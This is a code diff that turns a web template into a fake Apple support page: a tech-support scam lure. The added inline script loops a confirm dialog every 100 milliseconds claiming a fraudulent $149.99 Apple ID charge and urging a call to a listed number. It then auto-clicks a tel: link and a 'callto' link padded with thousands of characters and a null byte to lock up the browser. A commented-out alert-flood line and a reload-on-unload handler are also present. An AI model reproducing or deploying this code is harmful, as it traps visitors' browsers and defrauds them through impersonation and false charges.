+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-381-6140
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-    <!-- Jquery Slick , Owl-Carousel Plugins -->
-    <script src="./assets/js/owl.carousel.min.js"></script>
-    <script src="./assets/js/slick.min.js"></script>
-    <!-- One Page, Animated-HeadLin -->
-    <script src="./assets/js/wow.min.js"></script>
-    <script src="./assets/js/animated.headline.js"></script>
-    <script src="./assets/js/jquery.magnific-popup.js"></script>
 
-    <!-- Nice-select, sticky -->
-    <script src="./assets/js/jquery.nice-select.min.js"></script>
-    <script src="./assets/js/jquery.sticky.js"></script>
-    
-    <!-- contact js -->
-    <script src="./assets/js/contact.js"></script>
-    <script src="./assets/js/jquery.form.js"></script>
-    <script src="./assets/js/jquery.validate.min.js"></script>
-    <script src="./assets/js/mail-script.js"></script>
-    <script src="./assets/js/jquery.ajaxchimp.min.js"></script>
-    
-    <!-- Jquery Plugins, main Jquery -->	
-    <script src="./assets/js/plugins.js"></script>
-    <script src="./assets/js/main.js"></script>
-    
-</body>
-</html>
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-381-6140');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
